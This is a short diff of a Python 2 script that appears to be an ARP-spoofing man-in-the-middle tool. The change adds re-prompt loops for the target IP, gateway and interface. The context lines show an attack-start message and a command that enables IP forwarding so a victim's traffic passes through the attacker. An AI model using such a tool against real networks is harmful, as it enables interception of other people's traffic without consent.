@@ -12,10 +12,16 @@ import sys
 ## START ##
 
 VIP = raw_input('TargetIP: ')
+while VIP =="" or VIP is None:
+	VIP = raw_input('TargetIP: ')
+	
 GW = raw_input('Gateway: ')
+while GW == "" or GW is None:
+	GW = raw_input('Gateway: ')
 IFACE = raw_input('interface: ')
-
-
+while IFACE == "" or IFACE is None:
+	IFACE = raw_input('interface: ')
+	
 print '\t\t\nAttack Has Been Start ON >>> {} .... \n'.format(VIP)
 os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #Ensure the victim recieves packets by forwarding them
 
